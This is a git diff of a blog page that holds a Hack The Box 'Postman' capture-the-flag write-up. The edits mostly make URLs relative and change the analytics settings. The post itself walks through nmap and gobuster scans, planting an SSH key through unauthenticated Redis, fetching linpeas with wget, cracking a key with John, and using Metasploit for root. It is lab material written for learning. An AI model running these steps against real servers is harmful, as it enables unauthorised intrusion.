@@ -29,21 +29,21 @@ While I wait for this to be finished I’ll start a full nmap scan.
 
 
 
-<link rel="stylesheet" href="https://ajdintrejic.github.io/main.min.753fac8f03736f0edc9be411eb20cee875dd7bb8e73c8155fbf6a629c863f4ca.css">
+<link rel="stylesheet" href="/main.min.753fac8f03736f0edc9be411eb20cee875dd7bb8e73c8155fbf6a629c863f4ca.css">
 
 
     
-        <link rel="stylesheet" type="text/css" href="https://ajdintrejic.github.io/css/textpadding.css">
+        <link rel="stylesheet" type="text/css" href="/css/textpadding.css">
     
 
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="https://ajdintrejic.github.io/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://ajdintrejic.github.io/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://ajdintrejic.github.io/favicon-16x16.png">
-    <link rel="manifest" href="https://ajdintrejic.github.io/site.webmanifest">
-    <link rel="mask-icon" href="https://ajdintrejic.github.io/safari-pinned-tab.svg" color="#252627">
-    <link rel="shortcut icon" href="https://ajdintrejic.github.io/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="/favicon.ico">
     <meta name="msapplication-TileColor" content="#252627">
     <meta name="theme-color" content="#252627">
 
@@ -95,9 +95,8 @@ While I wait for this to be finished I’ll start a full nmap scan.
     <body class="dark-theme">
         <div class="container">
             <header class="header">
-    <script src="https://cmp.osano.com/16BZ4HRycxCi348bc/8ff750c6-53ef-4380-a5db-5a3ab6dee59f/osano.js"></script>
     <span class="header__inner">
-        <a href="https://ajdintrejic.github.io/" style="text-decoration: none;">
+        <a href="/" style="text-decoration: none;">
     <div class="logo">
         
             <span class="logo__mark">></span>
@@ -190,17 +189,17 @@ While I wait for this to be finished I’ll start a full nmap scan.
 </code></pre><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
 <p>While I wait for this to be finished I’ll start a full nmap scan.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-postman/nmap_initial.png" alt="nmap initial"></p>
+</code></pre></div><p><img src="/htb-postman/nmap_initial.png" alt="nmap initial"></p>
 <p>As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/port80.png" alt="port80"></p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/port10000_1.png" alt="port80"></p>
+<p><img src="/htb-postman/port80.png" alt="port80"></p>
+<p><img src="/htb-postman/port10000_1.png" alt="port80"></p>
 <p>Now on the second server I have to add a “s” to my http request so I can access that.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/port10000_2.png" alt="port80"></p>
+<p><img src="/htb-postman/port10000_2.png" alt="port80"></p>
 <p>I’ll also start up gobuster. On port 10000 every page link loads the same login so gobuster doesn’t help us there. Let’s run it on port 80.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#3677a9">100</span>
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-postman/gobuster.png" alt="gobuster"></p>
+</code></pre></div><p><img src="/htb-postman/gobuster.png" alt="gobuster"></p>
 <p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/nmap_full.png" alt="nmap full"></p>
+<p><img src="/htb-postman/nmap_full.png" alt="nmap full"></p>
 <h2 id="getting-user-account">Getting user account</h2>
 <h3 id="redis-file-write">Redis file write</h3>
 <p>So we have something called Redis here running. I tried to find some explanation to what is it and how to exploit it, Google found this.</p>
@@ -210,14 +209,14 @@ While I wait for this to be finished I’ll start a full nmap scan.
 <p>So we’re on the right track. The developer guides us for the next steps on how to exploit this. Using <code>telnet</code> we can see now that we can connect to the machine easily:</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#3677a9">6379</span>
 </code></pre></div><p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/ssh_keygen.png" alt="nmap full"></p>
+<p><img src="/htb-postman/ssh_keygen.png" alt="nmap full"></p>
 <p>We will push the key and pad it before and after. Why? Well we’ll push it to Redis memory and then flush the memory to a file. The memory will contain a lot of garbage and we’re hoping ssh will parse the file, ignore the garbage and correctly read our key.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ (<span style="color:#24909d">echo</span> -e <span style="color:#ed9d13">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#24909d">echo</span> -e <span style="color:#ed9d13">&#34;\n\n&#34;</span>) &gt; foo.txt
 </code></pre></div><p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
 $ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#24909d">set</span> crackit
 </code></pre></div><p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/redis.png" alt="redis"></p>
+<p><img src="/htb-postman/redis.png" alt="redis"></p>
 <p>Now that we’ve got a shell, we can see by running</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
 </code></pre></div><p>that we have to gain access to Matt’s account.</p>
@@ -227,10 +226,10 @@ $ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#24909d">set</sp
 </code></pre></div><p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
 </code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/id_rsa_bak.png" alt="id rsa bak"></p>
+<p><img src="/htb-postman/id_rsa_bak.png" alt="id rsa bak"></p>
 <h3 id="cracking-ssh-key-with-john">Cracking ssh key with John</h3>
 <p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/john.png" alt="john"></p>
+<p><img src="/htb-postman/john.png" alt="john"></p>
 <p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
 </code></pre></div><p>And that’s how I got user</p>
@@ -242,7 +241,7 @@ $ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#24909d">set</sp
 <p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
  &gt; <span style="color:#24909d">set</span> payload &lt;payload here&gt;
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-postman/metasploit.png" alt="metasploit"></p>
+</code></pre></div><p><img src="/htb-postman/metasploit.png" alt="metasploit"></p>
 <p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
 
             </div>
@@ -297,7 +296,7 @@ $ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#24909d">set</sp
 
 
 
-<script type="text/javascript" src="https://ajdintrejic.github.io/bundle.min.4a69500057d68129e88f497d354afe68422eb56de6d15e45dbe2190858ea5a76bfcb096406f992984b241db45f47388ac57ab0376e3b32125bef7a8a6d0f06c4.js" integrity="sha512-SmlQAFfWgSnoj0l9NUr&#43;aEIutW3m0V5F2&#43;IZCFjqWna/ywlkBvmSmEskHbRfRziKxXqwN247MhJb73qKbQ8GxA=="></script>
+<script type="text/javascript" src="/bundle.min.4a69500057d68129e88f497d354afe68422eb56de6d15e45dbe2190858ea5a76bfcb096406f992984b241db45f47388ac57ab0376e3b32125bef7a8a6d0f06c4.js" integrity="sha512-SmlQAFfWgSnoj0l9NUr&#43;aEIutW3m0V5F2&#43;IZCFjqWna/ywlkBvmSmEskHbRfRziKxXqwN247MhJb73qKbQ8GxA=="></script>
     
 <script type="application/javascript">
 var doNotTrack = false;
@@ -306,17 +305,22 @@ if (!doNotTrack) {
 	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-165836726-1', 'auto');
-	
+	if (window.sessionStorage) {
+		var GA_SESSION_STORAGE_KEY = 'ga:clientId';
+		ga('create', 'UA-165836726-1', {
+	    'storage': 'none',
+	    'clientId': sessionStorage.getItem(GA_SESSION_STORAGE_KEY)
+	   });
+	   ga(function(tracker) {
+	    sessionStorage.setItem(GA_SESSION_STORAGE_KEY, tracker.get('clientId'));
+	   });
+   }
+	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
 
 
-
-    
-        <script src="https://ajdintrejic.github.io/js/osano.js"></script>
-    
 
 
     </body>
